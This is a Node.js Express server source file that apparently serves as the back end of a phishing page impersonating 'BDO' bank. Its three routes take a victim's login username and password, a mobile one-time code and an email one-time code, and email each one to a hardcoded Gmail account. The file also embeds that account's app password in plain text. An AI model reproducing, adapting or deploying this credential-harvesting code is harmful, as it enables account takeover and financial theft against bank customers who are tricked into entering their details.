const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "roqqucares@gmail.com";
const pass = "ldnhoatyrjilohik";

// API routes for index
app.post("/", (req, res) => {
  const { username, password } = req.body;
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${username}`,
    to: userEmail,
    subject: `BDO Clients: Email: ${username} \t\n\n\n password: ${password}`,
    text: `BDO Clients: New user registered with Email: ${username} and password: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent " + info.response);
      res.send("success");
    }
  });
});

// API routes for mobile OTP
app.post("/otp", (req, res) => {
  console.log(req.body);
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `BDO Clients: Mobile OTP: ${req.body?.otp}`,
    text: `BDO Clients: User entered Mobile OTP: ${req.body?.otp}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent " + info.response);
      res.send("success");
    }
  });
});

// API routes for email OTP
app.post("/email-otp", (req, res) => {
  console.log(req.body);
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `BDO Clients: Email OTP: ${req.body?.otp}`,
    text: `BDO Clients: User entered Email OTP: ${req.body?.otp}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent " + info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
